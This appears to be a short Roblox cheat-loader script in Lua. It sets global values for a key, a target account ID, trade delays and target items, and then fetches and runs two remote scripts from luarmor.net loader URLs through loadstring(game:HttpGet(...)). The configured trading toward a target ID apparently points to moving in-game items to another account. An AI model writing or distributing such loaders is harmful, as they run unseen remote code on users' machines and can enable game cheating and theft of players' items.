getgenv().SECRET_KEY = "mrr_2b8aa6477b8e48f996d002089b7065c8"
getgenv().TARGET_ID = 7426463263
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().TARGET_BRAINROTS = {
    -- Add target brainrots here
}
task.spawn(function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
end)
task.spawn(function()
loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/bc93e357ae39e9834fb508631421a0c4.lua"))()
end)
